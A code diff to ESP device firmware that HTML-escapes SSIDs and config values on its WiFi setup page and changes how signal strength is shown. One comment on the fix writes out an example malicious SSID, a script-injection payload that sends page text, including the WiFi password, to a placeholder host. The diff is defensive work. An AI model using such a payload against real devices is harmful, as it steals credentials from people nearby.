@@ -1214,7 +1214,8 @@ static void netTask(void *arg) {
 //  is up only while you are configuring, and its password is per-device.
 // ============================================================================
 static const char PAGE_CSS[] PROGMEM =
-  "<!doctype html><meta name=viewport content='width=device-width,initial-scale=1'>"
+  "<!doctype html><meta charset=utf-8>"
+  "<meta name=viewport content='width=device-width,initial-scale=1'>"
   "<title>PeekESP setup</title><style>"
   "*{box-sizing:border-box}"
   "body{margin:0;padding:20px;background:#05070E;color:#E6EDF7;"
@@ -1240,6 +1241,33 @@ static const char PAGE_CSS[] PROGMEM =
   "p.hint{margin:-4px 0 12px;font-size:12px;line-height:1.45;color:#5C6B82}"
   "</style>";
 
+/**
+ * Escape text before it goes into the page.
+ *
+ * An SSID is not our data - it is a string any access point within range can
+ * choose. Dropped into HTML unescaped, a neighbour who names their network
+ *   "><script>fetch('http://x/?t='+document.body.innerText)</script>
+ * gets script execution on the configuration page, which is where the WiFi
+ * password and the read token are typed. Being in radio range is the only
+ * access required.
+ */
+static String html_escape(const String &in) {
+  String out;
+  out.reserve(in.length() + 16);
+  for (size_t i = 0; i < in.length(); i++) {
+    const char c = in[i];
+    switch (c) {
+      case '&':  out += F("&amp;");  break;
+      case '<':  out += F("&lt;");   break;
+      case '>':  out += F("&gt;");   break;
+      case '"':  out += F("&quot;"); break;
+      case '\'': out += F("&#39;");  break;
+      default:   out += c;
+    }
+  }
+  return out;
+}
+
 static String field(const char *label, const char *name, const char *value,
                     const char *type = "text") {
   String s = F("<label><span>");
@@ -1249,7 +1277,7 @@ static String field(const char *label, const char *name, const char *value,
   s += F(" name=");
   s += name;
   s += F(" value=\"");
-  s += value;                      // values here are our own stored config
+  s += html_escape(value);         // stored config, but an SSID came from the air
   s += F("\"></label>");
   return s;
 }
@@ -1296,19 +1324,25 @@ static void handle_root() {
         if (!used[i] && WiFi.SSID(i) == ssid) used[i] = true;
       }
 
-      const int rssi = WiFi.RSSI(best);
-      const char *bars = rssi > -55 ? "||||" : rssi > -65 ? "|||-"
-                       : rssi > -75 ? "||--" : "|---";
+      // A percentage and a padlock, rather than the "|||*" this used to
+      // print - which read as noise stuck on the end of the network name.
+      // The usual dBm-to-quality mapping: -50 and better is full, -100 is none.
+      int quality = 2 * (WiFi.RSSI(best) + 100);
+      if (quality > 100) quality = 100;
+      if (quality < 0) quality = 0;
 
+      const String safe = html_escape(ssid);
       p += F("<option value=\"");
-      p += ssid;
+      p += safe;
       p += F("\"");
       if (ssid == cfg.wifi_ssid) p += F(" selected");
       p += F(">");
-      p += ssid;
-      p += F("  ");
-      p += bars;
-      if (WiFi.encryptionType(best) != WIFI_AUTH_OPEN) p += F(" *");
+      p += safe;
+      p += F("  —  ");
+      p += quality;
+      p += F("%");
+      if (WiFi.encryptionType(best) != WIFI_AUTH_OPEN) p += F("  🔒");
+      else                                             p += F("  open");
       p += F("</option>");
     }
     // Empty string as the sentinel: a zero-length SSID is not valid, so it
@@ -1321,7 +1355,7 @@ static void handle_root() {
     // without putting a second confusing text box in front of everyone.
     p += F("<label id=m hidden><span>Network name</span>"
            "<input type=text name=ssid_manual value=\"\"></label>");
-    p += F("<p class=hint>* needs a password. <a href=/rescan>Scan again</a></p>");
+    p += F("<p class=hint><a href=/rescan>Scan again</a></p>");
   }
 
   p += field("Password", "pass", cfg.wifi_pass, "password");
